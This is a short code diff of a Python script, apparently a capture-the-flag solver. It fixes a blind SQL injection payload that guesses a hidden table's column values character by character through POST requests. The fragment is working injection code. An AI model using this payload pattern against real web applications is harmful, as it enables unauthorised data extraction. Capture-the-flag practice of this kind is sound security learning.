@@ -52,7 +52,7 @@ def get_column(url,strings):
         for one_char in strings:
             one_char = column_name + one_char
             data = {
-               'id':"1&&((select 1,'str(one_char)') > (select * from f1ag_1s_h3r3_hhhhh))"
+               'id':"1&&((select 1,'"+str(one_char)+"') > (select * from f1ag_1s_h3r3_hhhhh))"
             }
             time.sleep(0.05)
             rs = requests.post(url,data)
